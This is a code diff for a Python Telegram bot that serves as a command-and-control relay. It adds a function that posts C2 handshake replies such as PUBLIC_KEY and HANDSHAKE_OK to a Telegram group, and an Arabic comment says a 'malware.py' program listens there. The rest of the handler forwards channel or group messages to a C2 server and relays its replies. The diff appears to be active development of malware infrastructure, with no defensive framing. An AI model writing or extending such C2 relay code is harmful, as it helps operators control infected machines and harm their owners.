@@ -70,18 +70,28 @@ def _allowed_protocol_sender(update: Update) -> bool:
     return False
 
 
+async def _send_protocol_reply(context: ContextTypes.DEFAULT_TYPE, text: str) -> None:
+    """
+    malware.py يستمع على الجروب فقط — PUBLIC_KEY و HANDSHAKE_OK لازم توصل للجروب مباشرة.
+    """
+    try:
+        await context.bot.send_message(chat_id=int(C2_GROUP_ID), text=text)
+    except Exception as e:
+        print(f"[relay → group] {e}")
+
+
 async def handle_c2_protocol(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """جروب مناقشة أو القناة → يمرّر نص البروتوكول إلى C2."""
     msg = update.effective_message
     if not msg or not msg.text:
         return
 
-    cid = str(msg.chat.id)
+    chat_key = str(msg.chat.id)
 
-    if cid == C2_GROUP_ID:
+    if chat_key == C2_GROUP_ID:
         if not _allowed_protocol_sender(update):
             return
-    elif cid != C2_CHANNEL_ID:
+    elif chat_key != C2_CHANNEL_ID:
         return
 
     text = msg.text.strip()
@@ -97,7 +107,7 @@ async def handle_c2_protocol(update: Update, context: ContextTypes.DEFAULT_TYPE)
         )
         reply = r.json().get("reply")
         if reply:
-            await context.bot.send_message(chat_id=int(C2_CHANNEL_ID), text=reply)
+            await _send_protocol_reply(context, reply)
     except Exception as e:
         print(f"[C2 protocol handler] error: {e}")
 
